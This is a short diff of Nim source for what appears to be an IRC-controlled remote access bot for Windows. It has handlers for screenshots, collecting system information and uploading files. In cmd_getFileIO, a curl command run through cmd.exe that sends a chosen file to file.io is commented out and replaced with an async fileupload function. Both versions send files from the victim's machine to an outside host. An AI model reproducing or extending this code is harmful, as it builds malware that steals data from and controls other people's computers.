@@ -1,4 +1,4 @@
-import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings, screenshot, random, winim, bitops, alphanum, sequtils
+import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings, screenshot, winim, bitops, alphanum, fileupload
 
 let
     g_dbg* = true
@@ -165,7 +165,8 @@ proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.
     if fileExists(filename):
         try:
             var
-                (output, _ ) = execCmdEx("cmd.exe /C curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
+                #(output, _ ) = execCmdEx("cmd.exe /C curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
+                output:string = await fileupload(filename)
                 trash:string
                 i:int = 0
 
@@ -456,7 +457,6 @@ proc cmd_hey(event:IrcEvent, client:AsyncIrc, verbose:bool) {.async.} =
     var
         win_ver = "<void>"
         win_csd = "<void>"
-        win_sys = "<void>"
         win_mod = "<void>"
         finalmsg:string = ""
 
